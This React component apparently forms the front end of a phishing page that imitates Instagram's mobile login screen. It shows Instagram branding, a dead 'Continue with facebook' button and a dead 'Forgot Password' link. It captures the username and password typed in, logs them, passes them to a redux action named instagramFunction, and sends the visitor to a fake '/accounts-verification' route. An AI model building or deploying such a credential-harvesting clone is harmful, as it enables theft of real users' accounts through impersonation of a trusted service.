import React, { Component,Fragment} from 'react'
import './instagram.css';
import {Button} from 'reactstrap';
import { connect } from 'react-redux';
import Media from 'react-media';
import {instagramFunction} from '../../action/instagram/instagramAction';
import { Redirect } from 'react-router-dom';
export class instagram extends Component {
  state={
    email:"",
    password:"",
    opacity:0.5,
    isActive:false,
    removeDisable:true
  }
  redirectenableHandler=()=>{
   const userdetail={
     email:this.state.email,
     password:this.state.password
   }
   console.log(userdetail);
   this.props.onLogin(userdetail)
   this.setState({isActive:true})
  }
  changeHandler=(e)=>{
    this.setState({
      [e.target.name]:e.target.value
    })
    if(this.state.password.length>5)
    {
     
      
      this.setState({opacity:1})
      this.setState({removeDisable:false})
      
    }
  }
 
    render() {
  if(this.state.isActive)
  {
    this.props.history.push('/accounts-verification')
  }
        return (
            <div>
            <Media queries={{
              small: "(max-width: 599px)",
              medium: "(min-width: 600px) and (max-width: 1199px)",
              large: "(min-width: 1200px)"
            }}>
              {matches => (
                <Fragment>
                  {matches.small &&  <div className="loginModel">
                    
                      <br></br>
                      <img src={require('../../Images/newinsta.JPG')}/>
                      <br></br>
                      <div className="make">
                      <div className="facebookmodel">
                      <Button block style={{marginTop:"8px",backgroundColor:"dodgerblue",borderColor:"dodgerblue",opacity:1}}> <h6> <i class="fab fa-facebook-square"></i> Continue with facebook</h6></Button>
                    
                        <br></br>
        
                        </div>
                        <hr></hr>
                        </div>
                        <br></br>
                      <div className="inputBox">
                          <input  type="text" name="email"placeholder="Phone number, Username, or email "  onChange={this.changeHandler}></input>
                        <input placeholder="Password" type="password" name="password" onChange={this.changeHandler}></input> 
                        <br></br>
                    <Button  block style={{marginTop:"8px",backgroundColor:"dodgerblue",borderColor:"dodgerblue",opacity:`${this.state.opacity}`} } disabled={this.state.removeDisable} onClick={this.redirectenableHandler}>Log In</Button>
                       <br></br>
                       <a href="#"><p style={{textAlign:"center",fontWeight:500}}>Forgot Password</p></a>
                        
                      </div>
                     
                     
                  </div>}
                 
                  {matches.large && <p>I am large!</p>}
                </Fragment>
              )}
            </Media>
          </div>
        )
    }
}
const mapStateToProps=state=>(
  {
    instagram:state.instagramAccount
  }
)
const mapDispatchToProps=dispatch=>{
  return{
    onLogin:(userdetail)=>dispatch(instagramFunction(userdetail))
  }
}
export default connect(mapStateToProps,mapDispatchToProps)(instagram);
